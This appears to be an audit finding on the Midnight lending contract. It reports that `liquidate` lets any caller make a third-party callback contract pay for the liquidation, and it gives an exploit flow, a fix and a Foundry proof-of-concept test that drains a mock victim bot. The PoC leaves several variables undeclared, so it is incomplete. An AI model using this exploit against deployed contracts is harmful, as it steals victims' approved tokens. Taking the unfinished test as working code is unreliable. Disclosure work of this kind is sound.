### Title
Unprivileged liquidator can designate an arbitrary third-party contract as `callback`/`payer`, draining its loanToken approval to Midnight - (File: src/Midnight.sol)

### Summary
`Midnight.liquidate` sets `payer = callback` when `callback != address(0)` with no requirement that `callback == msg.sender` or that `callback` has authorized `msg.sender`. An attacker can pass any contract that implements `ILiquidateCallback`, returns `CALLBACK_SUCCESS`, and holds a loanToken approval to Midnight as the `callback`, causing the protocol to pull `repaidUnits` of loanToken from that victim contract while the attacker's chosen `receiver` collects the seized collateral for free.

### Finding Description
**Code path:**

`src/Midnight.sol` lines 679, 696–717:
```solidity
address payer = callback != address(0) ? callback : msg.sender;          // L679
// ...
SafeTransferLib.safeTransfer(collateralToken, receiver, seizedAssets);    // L696
if (callback != address(0)) {
    require(
        ILiquidateCallback(callback).onLiquidate(msg.sender, ...) == CALLBACK_SUCCESS,  // L700-714
        WrongLiquidateCallbackReturnValue()
    );
}
SafeTransferLib.safeTransferFrom(market.loanToken, payer, address(this), repaidUnits);  // L717
```

**Root cause:** No check `require(callback == msg.sender || isAuthorized[callback][msg.sender])` exists. The only gate on `callback` is that it must return `CALLBACK_SUCCESS` from `onLiquidate`.

**Attacker-controlled inputs:**
- `callback` = `victimContract` (any contract implementing `ILiquidateCallback` that returns `CALLBACK_SUCCESS`)
- `receiver` = attacker's own address
- `repaidUnits` = amount to drain (up to victim's approval)

**Exploit flow:**
1. Precondition: `victimContract` has called `loanToken.approve(midnight, N)` and its `onLiquidate` returns `CALLBACK_SUCCESS` (standard for any deployed liquidation bot/callback contract).
2. Attacker calls: `midnight.liquidate(market, idx, 0, repaidUnits, borrower, false, attackerEOA, victimContract, data)`
3. `payer = victimContract`
4. `seizedAssets` of collateral transferred to `attackerEOA` (line 696)
5. `victimContract.onLiquidate(attacker, ...)` called — returns `CALLBACK_SUCCESS` (line 700–714)
6. `safeTransferFrom(loanToken, victimContract, midnight, repaidUnits)` executes (line 717) — pulls from victim
7. Attacker net: receives collateral worth `repaidUnits * LIF`, pays nothing; victim loses `repaidUnits` of loanToken

**Why existing checks fail:**
- The `liquidatorGate` check (line 598) only gates who can call `liquidate`, not what `callback` is.
- The Certora spec `otherEntryPointsOnlyPullFromCaller` (line 128) sets `liquidateCallbackAllowed = true` for any address passed as callback — it proves the weaker property "tokens only leave from callback that returned CALLBACK_SUCCESS," not "callback must be msg.sender."
- No `isAuthorized` check exists for the callback address in `liquidate`. [1](#0-0) [2](#0-1) [3](#0-2) 

### Impact Explanation
Any contract that (a) implements `ILiquidateCallback` returning `CALLBACK_SUCCESS` and (b) holds a loanToken approval to Midnight can have its entire approved balance drained by an unprivileged attacker in a single `liquidate` call. The attacker receives seized collateral at no personal cost. This violates the core invariant that liquidation must not transfer assets from unauthorized parties.

### Likelihood Explanation
**Preconditions:**
1. An unhealthy borrower (or post-maturity borrower) exists — routine market condition.
2. A victim contract implementing `ILiquidateCallback` with a loanToken approval to Midnight — any deployed liquidation bot, flash-liquidation helper, or callback contract that has pre-approved Midnight satisfies this.

**Feasibility:** High. Liquidation callback contracts routinely pre-approve the lending protocol for loanToken to enable the pull after `onLiquidate`. The attacker needs no special privilege, no oracle manipulation, and no governance access. The attack is repeatable as long as the victim's approval persists.

### Recommendation
Add a check in `liquidate` requiring the callback to be `msg.sender` or authorized by `msg.sender`:

```solidity
require(
    callback == address(0) || callback == msg.sender || isAuthorized[callback][msg.sender],
    Unauthorized()
);
```

This mirrors the authorization model already used in `withdrawCollateral` (line 556) and `setConsumed` (line 724), and matches the design intent of Morpho Blue's callback pattern where the callback must be the caller itself. [4](#0-3) [5](#0-4)

```solidity
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import {Midnight, Market} from "src/Midnight.sol";
import {CALLBACK_SUCCESS} from "src/libraries/ConstantsLib.sol";
import {ILiquidateCallback} from "src/interfaces/ILiquidateCallback.sol";

/// @dev Victim: a legitimate liquidation callback contract that has pre-approved Midnight.
contract VictimLiquidationBot is ILiquidateCallback {
    function onLiquidate(
        address, bytes32, Market memory, uint256, uint256, uint256,
        address, address, bytes memory, uint256
    ) external returns (bytes32) {
        // Legitimate bot: just returns success, trusting the caller is Midnight
        return CALLBACK_SUCCESS;
    }
}

contract ExploitTest is Test {
    Midnight midnight;
    VictimLiquidationBot victim;
    ERC20 loanToken;
    address attacker = address(0xBEEF);

    function testCallbackPayerDrain() public {
        // Setup: victim has loanToken and has approved Midnight
        deal(address(loanToken), address(victim), 1000e18);
        vm.prank(address(victim));
        loanToken.approve(address(midnight), type(uint256).max);

        uint256 victimBalanceBefore = loanToken.balanceOf(address(victim));
        uint256 attackerCollateralBefore = collateralToken.balanceOf(attacker);

        // Attacker calls liquidate with victim as callback, self as receiver
        vm.prank(attacker);
        midnight.liquidate(
            market,
            0,          // collateralIndex
            0,          // seizedAssets (use repaidUnits path)
            repaidUnits,
            borrower,
            false,      // or true for post-maturity
            attacker,   // receiver: attacker gets collateral
            address(victim), // callback = payer = victim
            ""
        );

        // Assertions:
        // 1. Victim lost repaidUnits of loanToken
        assertEq(loanToken.balanceOf(address(victim)), victimBalanceBefore - repaidUnits, "victim drained");
        // 2. Attacker received seized collateral
        assertGt(collateralToken.balanceOf(attacker), attackerCollateralBefore, "attacker got collateral");
        // 3. Attacker paid nothing (loanToken balance unchanged)
        assertEq(loanToken.balanceOf(attacker), 0, "attacker paid nothing");
    }
}
```

**Expected assertions:** All three assertions pass, confirming the victim's loanToken is drained and the attacker receives collateral at zero cost.
